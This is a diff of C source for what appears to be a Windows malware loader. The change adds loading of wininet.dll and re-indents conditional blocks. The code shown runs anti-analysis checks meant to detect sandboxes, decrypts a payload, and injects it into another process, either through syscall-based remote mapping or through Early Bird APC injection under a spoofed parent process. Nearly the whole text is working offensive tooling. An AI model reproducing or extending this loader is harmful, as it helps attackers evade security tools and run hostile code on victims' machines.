@@ -33,7 +33,8 @@ int main() {
 
 	// TODO: Init kernel32 WinAPIs first and then use hashed-resolved version of LoadLibraryA for loading user32.dll
 	// Load user32.dll for use
-	LoadLibraryA("user32.dll");
+	HMODULE hUser32Dll = LoadLibraryA("user32.dll");
+	HMODULE hWininetDll = LoadLibraryA("wininet.dll");
 
 	// Init WinApis for use
 	if (InitializeWinApis() == FALSE) {
@@ -51,14 +52,14 @@ int main() {
 	DWORD dwPid = 0;
 	HANDLE hProcess = NULL, hSpoofedParentProcess = NULL, hThread = NULL;
 
-	#ifdef ANTI_ANALYSIS
-		// Anti-analysis techniques
-		DWORD	seconds = 5;
-		DWORD	dwMilliseconds = seconds * 1000;
-		if (AntiAnalysis(dwMilliseconds) == FALSE) {
-			PRINTA("File Is Being Analyzed!\n");
-		}
-	#endif
+#ifdef ANTI_ANALYSIS
+	// Anti-analysis techniques
+	DWORD	seconds = 5;
+	DWORD	dwMilliseconds = seconds * 1000;
+	if (AntiAnalysis(dwMilliseconds) == FALSE) {
+		PRINTA("File Is Being Analyzed!\n");
+	}
+#endif
 
 	// Resource reading is only for debugging purposes
 	//if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
@@ -116,46 +117,46 @@ int main() {
 	}
 	PRINTA("\t>>> Decrypted Payload Located At : 0x%p \n", pAllocatedAddress);
 
-	#ifdef LOCAL_INJECTION
-		RemoteMappingInjectionViaSyscalls(
-			GetCurrentProcessHandle(),
-			pAllocatedAddress,
-			sPayloadSize,
-			TRUE
-		);
-	#else
-		#ifndef APC_INJECTION
-			// Process enumeration
-			PRINTA("[i] Enumerating Processes...\n");
-			if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
-				PRINTW(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
-				return -1;
-			}
-			PRINTW(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);
+#ifdef LOCAL_INJECTION
+	RemoteMappingInjectionViaSyscalls(
+		GetCurrentProcessHandle(),
+		pAllocatedAddress,
+		sPayloadSize,
+		TRUE
+	);
+#else
+#ifndef APC_INJECTION
+	// Process enumeration
+	PRINTA("[i] Enumerating Processes...\n");
+	if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
+		PRINTW(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
+		return -1;
+	}
+	PRINTW(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);
 
-			// Attack
-			RemoteMappingInjectionViaSyscalls(
-				hProcess,
-				pPayloadAddress,
-				sPayloadSize,
-				FALSE
-			);
-		#else 
-			// Process enumeration
-			PRINTA("[i] Enumerating Processes...\n");
-			if (GetRemoteProcessHandle(SPOOFED_PARENT_PROCESS, &dwPid, &hSpoofedParentProcess) != TRUE) {
-				PRINTW(L"[!] Failed To Find Spoofed Parent Process %ls\n", SPOOFED_PARENT_PROCESS);
-				return -1;
-			}
-			PRINTW(L"[+] Found Spoofed Parent Process: %ls with PID: %d And Handle: %p!\n", SPOOFED_PARENT_PROCESS, dwPid, hSpoofedParentProcess);
+	// Attack
+	RemoteMappingInjectionViaSyscalls(
+		hProcess,
+		pPayloadAddress,
+		sPayloadSize,
+		FALSE
+	);
+#else 
+	// Process enumeration
+	PRINTA("[i] Enumerating Processes...\n");
+	if (GetRemoteProcessHandle(SPOOFED_PARENT_PROCESS, &dwPid, &hSpoofedParentProcess) != TRUE) {
+		PRINTW(L"[!] Failed To Find Spoofed Parent Process %ls\n", SPOOFED_PARENT_PROCESS);
+		return -1;
+	}
+	PRINTW(L"[+] Found Spoofed Parent Process: %ls with PID: %d And Handle: %p!\n", SPOOFED_PARENT_PROCESS, dwPid, hSpoofedParentProcess);
 
-			// Attack
-			if (!RemoteEarlyBirdApcInjectionViaSyscalls(hSpoofedParentProcess, SACRIFICIAL_PROCESS, pAllocatedAddress, sPayloadSize)) {
-				PRINTA("[!] RemoteEarlyBirdApcInjectionViaSyscalls Failed With Error : %d \n", GetLastError());
-				return -1;
-			}
-		#endif
-	#endif
+	// Attack
+	if (!RemoteEarlyBirdApcInjectionViaSyscalls(hSpoofedParentProcess, SACRIFICIAL_PROCESS, pAllocatedAddress, sPayloadSize)) {
+		PRINTA("[!] RemoteEarlyBirdApcInjectionViaSyscalls Failed With Error : %d \n", GetLastError());
+		return -1;
+	}
+#endif
+#endif
 
 #endif
 
